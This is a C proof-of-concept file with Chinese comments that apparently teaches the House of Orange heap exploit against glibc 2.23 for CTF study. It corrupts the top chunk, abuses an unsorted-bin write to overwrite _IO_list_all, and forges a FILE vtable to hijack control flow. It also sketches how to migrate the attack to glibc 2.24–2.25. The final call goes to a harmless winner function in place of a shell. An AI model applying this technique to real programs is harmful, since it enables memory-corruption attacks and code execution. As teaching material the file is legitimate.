/*
 * 中文导读（CTF 版）
 *
 * 手法：house_of_orange
 * 文件标注范围：2.23（原始任意 vtable 版本）
 * 模拟漏洞：无 free 条件下可覆盖 top size，并能伪造 FILE。
 * 核心流程：先让 sysmalloc 把旧 top 放入 unsorted，再用 unsorted write 劫持 _IO_list_all，最后触发旧式 FSOP。
 * 成功判据：PoC 的函数指针被调用；2.26 的 abort/stdio 路径变化终止这条经典端到端链，2.29 又封掉 top 部分。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>

/*
 * House of Orange 利用堆溢出先破坏 top chunk，再借 unsorted-bin 写入改写
 * _IO_list_all，最终用伪造的 _IO_FILE 劫持虚表调用。完整端到端链需要已知
 * 堆地址与 libc 地址；原始思路来自 Angelboy：
 * http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html
 */

/*
 * winner 代替真题中的 system/one-gadget。把它当作已经通过 libc 泄漏或
 * 程序符号获得地址的最终控制流目标；这样 PoC 不依赖交互式 shell。
 */
int winner ( char *ptr);

int main()
{
    /*
     * 前提是假设一个堆上缓冲区溢出能够覆盖相邻 top（wilderness）chunk。
     * 进程初次建立 brk 堆后，尚未分配的尾部都属于 top；普通 malloc 会从
     * top 前端切走一块，因此 top 越来越小。当请求大于剩余 top 时，分配器
     * 会尝试扩展 brk，或者对足够大的请求单独 mmap。经典环境的 mmap 阈值
     * 约为 0x20000 一带；本例请求 0x1000，意图强迫 sysmalloc 扩展堆而不是
     * 直接返回 mmap chunk。
     */

    char *p1, *p2;
    size_t io_list_all, *top;

    // 第一次分配从 top 切出 0x400 物理尺寸，为越界覆盖 top header 创造相邻关系。

    p1 = malloc(0x400-16);

    /*
     * 经典运行中初始 top 约为 0x21000；切走 0x400 后常见剩余 size 为
     * 0x20c01，其中最低位是 PREV_INUSE。sysmalloc 在接纳旧 top 时至少
     * 检查两件事：old_top + old_size 必须落在页边界，并且 PREV_INUSE
     * 必须保持置位。把 size 覆盖为 0xc01 同时满足二者：有效尺寸 0xc00
     * 保持页尾对齐，最低位 1 表示前块仍在使用。该常量依赖本例的堆布局，
     * 真题应根据实际 top 地址与页大小重新计算。
     */

    top = (size_t *) ( (char *) p1 + 0x400 - 16);
    top[1] = 0xc01;

    /*
     * 请求 0x1000 大于伪造后的 0xc00 top，迫使 malloc 进入 sysmalloc。
     * 正常情况下，新 brk 区域若与旧堆连续，分配器只会扩展 top；本例故意把
     * old_size 伪造成比真实尾部小，使旧 top 的逻辑末端与真实 program break
     * 不连续。sysmalloc 建立新 top 与 fencepost 后，会把旧 top 的可用部分
     * 交给 _int_free。它大于 fastbin 上限，所以进入 unsorted bin。
     *
     * 触发前的抽象布局：
     *   堆起点 | 已分配块 | 被截短的旧 top | 未计入的尾部 | 真实堆尾
     * 触发后的抽象布局：
     *   堆起点 | 已分配块 | unsorted 中的旧 top | fencepost | 新 top
     *
     * 这就是 House of Orange 的“无显式 free 也能得到 unsorted chunk”阶段。
     */

    p2 = malloc(0x1000);
    /*
     * 此时旧 top 已作为 free chunk 进入 unsorted bin。第二阶段再次利用同一
     * 堆溢出，覆盖该 free chunk 的 size、fd 与 bk。理论上可以把双链指针
     * 组织成“任意地址分配”，也可以利用摘链时写入 unsorted 表头地址的副作用
     * 获得定址写；本例采用 Angelboy 的后一种链。
     *
     * 旧版 malloc 检测到伪造链表后会进入错误处理，错误处理又会调用
     * _IO_flush_all_lockp 刷新 _IO_list_all 中的所有流。攻击者把
     * _IO_list_all 改到伪 FILE，并让其 _IO_OVERFLOW 槽指向 system/winner，
     * 就把一次堆一致性错误变成控制流劫持。传统载荷还把 FILE 开头写成
     * \"/bin/sh\"，使 _IO_OVERFLOW(fp, EOF) 等价于 system(\"/bin/sh\")。
     * FILE 利用背景资料：
     * https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/
     *
     * unsorted victim 的 fd/bk 泄露 main_arena，因此已知目标 libc 后可由
     * 固定符号差值计算 _IO_list_all 地址。
     */

    io_list_all = top[2] + 0x9a8;

    /*
     * malloc 从 unsorted 摘下 victim 时执行 bck->fd = unsorted_chunks(av)。
     * 在目标版本中，这次写发生于后续错误检查之前，所以即使伪链最终触发
     * abort，副作用也已经完成。fd 字段相对伪 chunk 基址偏移 0x10；要覆盖
     * _IO_list_all，便把 victim->bk 设置成 _IO_list_all-0x10。
     */
 
    top[3] = io_list_all - 0x10;

    /*
     * 经典载荷会以伪 FILE 本身作为 system 的第一个参数，所以在结构开头写入
     * \"/bin/sh\\0\"。本回归最终调用 winner，但仍保留该布局，便于和原链对照。
     */

    memcpy( ( char *) top, "/bin/sh\x00", 8);

    /*
     * _IO_flush_all_lockp 从 _IO_list_all 开始沿 FILE 链表遍历，下一节点字段
     * 在伪 FILE 基址加 0x68。unsorted attack 能写入的值不是任意值，而是
     * main_arena 中的 unsorted 表头地址；该地址附近恰好也是 smallbin 数组。
     * 因此还要让旧 top 被归类进对应 smallbin，使 main_arena+0x68 所解释的
     * FILE 链字段最终回指这块攻击者可控内存。bin 组织可参考：
     * https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/
     *
     * 把旧 top 的 size 改为 0x61（有效尺寸 0x60，并保留 PREV_INUSE），再
     * 发起一个不匹配请求，malloc 会把它从 unsorted 整理到相应 smallbin。
     * 接着沿伪造 bk 访问 _IO_list_all 时，分配器读到小于 MINSIZE 的非法
     * size 并触发错误路径；旧版错误路径刷新所有 FILE，正好启动 FSOP。
     * 对应旧源码位置：
     * https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717
     */

    top[1] = 0x61;

    /*
     * 接下来满足 _IO_flush_all_lockp 对待刷新流的筛选条件。旧源码见：
     * https://code.woboq.org/userspace/glibc/libio/genops.c.html#813
     * 对普通窄字符流，需要令 _mode <= 0，并让 _IO_write_ptr 严格大于
     * _IO_write_base，分配器才会调用该 FILE 的 overflow 槽。
     */

    FILE *fp = (FILE *) top;

    // 条件一：把 _mode 设为 0，满足 fp->_mode <= 0。

    fp->_mode = 0; // 该字段位于本版本伪 FILE 基址 top+0xc0。

    // 条件二：用 2 与 3 构造严格大小关系，满足 write_ptr > write_base。

    fp->_IO_write_base = (char *) 2; // _IO_write_base 位于 top+0x20。
    fp->_IO_write_ptr = (char *) 3; // _IO_write_ptr 位于 top+0x28。

    /*
     * 最后把 FILE 尾后的 vtable 指针指向受控 jump_table。旧版
     * _IO_OVERFLOW 对应表中第 3 个函数指针，即 jump_table+0x18；把该槽
     * 写成 winner 后，刷新伪流就会转入成功函数。glibc 2.24 开始加入 vtable
     * 白名单，本文件因此只标注并动态验证 2.23。
     */

    size_t *jump_table = &top[12]; // 直接把 jump table 放在旧 top 的受控用户区内。
    jump_table[3] = (size_t) &winner;
    *(size_t *) ((size_t) fp + sizeof(FILE)) = (size_t) jump_table; // vtable 指针位于 top+sizeof(FILE)，本版为 top+0xd8。

    /* 最后一次 malloc 触发 unsorted 检查失败、错误路径刷新 FILE，并调用 winner。 */
    malloc(10);

    /* 正常情况下上面的 malloc 会在错误路径 flush fake FILE，并由 winner
       直接 SYS_exit(0)。若控制流没有到 winner 而意外返回，必须以失败退出，
       不能让 main 的 return 0 把失效链误报成成功。 */
    _exit(1);

   /*
    * 原始利用通常会先打印 libc 堆错误信息，再进入 system 获得 shell。
    * 本 PoC 的 winner 使用无缓冲 write 输出成功标记并直接退出。
    */

    return 0;
}

int winner(char *ptr)
{ 
    /*
     * 只验证 FSOP 已经把控制流送到攻击者函数。旧版 how2heap 在这里调用
     * system("/bin/sh")；但此时 _IO_list_all/unsorted 链本来就是损坏状态，
     * system 内部的额外 libc/stdio 活动会让结果依赖具体发行版构建。
     * write + SYS_exit 都不再经过 malloc，成功判据更稳定、也更适合教学。
     */
    (void) ptr;
    static const char success[] = "[+] 成功：伪造 FILE 的 overflow 函数已被调用\n";
    write(STDOUT_FILENO, success, sizeof(success) - 1);
    syscall(SYS_exit, 0);
    return 0;
}

/*
 * ======================== glibc 2.24～2.25 迁移伪代码 ========================
 *
 * 本文件的 top corruption、sysmalloc 回收 old top 和 unsorted 写前半段在
 * 2.24～2.25 仍可复用；变化发生在 FILE vtable。2.24 起不能再把 vtable
 * 指向堆上自造的 jump table，应改用白名单内的合法 `_IO_str_jumps`：
 *
 *     保留本文件中缩小 top、制造 old-top unsorted 和挂 `_IO_list_all`；
 *     fake_file 开头可以放 "/bin/sh"；
 *     fake_file._IO_write_base = 0；
 *     fake_file._IO_write_ptr = 1；
 *     fake_file._IO_buf_base = 可控旧缓冲区；
 *     fake_file._IO_buf_end = 旧缓冲区末尾；
 *     fake_file._mode = 0；
 *     fake_file.vtable = 附件 libc 中的 `_IO_str_jumps`；
 *     按 `_IO_str_overflow` 的实际槽位和字段重新选择最终回调关系；
 *     再触发 malloc 错误路径刷新 FILE；
 *
 * 2.26 起 malloc_printerr/abort 不再沿经典路径刷新 stdio，端到端 Orange
 * 触发链失效；old top 被 sysmalloc 回收这一底层原语本身仍可单独使用。
 */
